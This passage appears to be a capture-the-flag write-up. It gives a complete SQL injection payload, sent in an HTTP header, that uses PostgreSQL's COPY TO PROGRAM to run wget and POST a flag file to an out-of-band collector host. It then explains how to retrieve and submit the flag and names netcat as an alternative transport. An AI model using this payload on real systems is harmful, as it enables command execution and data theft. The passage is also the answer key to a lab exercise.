The `oob` collector sidecar shares the DB's private network. Whatever the RCE
POSTs to `http://oob:9000/<anything>` is stored, and the app has a proxy —
`GET /oob/received` — that lets you see what was captured.

The full payload:

```
X-FCTUID: u', 'attacker-01', now()); COPY audit_log TO PROGRAM
  'wget -q -O- --post-file=/labflag/flag.txt http://oob:9000/exfil'; --
```

Then:

```
GET /oob/received
```

You will see a base64-encoded body for path `/exfil`. Decode it — the flag
(`FLAG{<64 hex>}`) is right there. Submit with:

```
POST /solve   {"flag":"FLAG{...}"}
```

The postgres:16-alpine image ships busybox `wget` / `base64` / `nc`, so you have
plenty of transport options if `wget` is unavailable in a future variant.
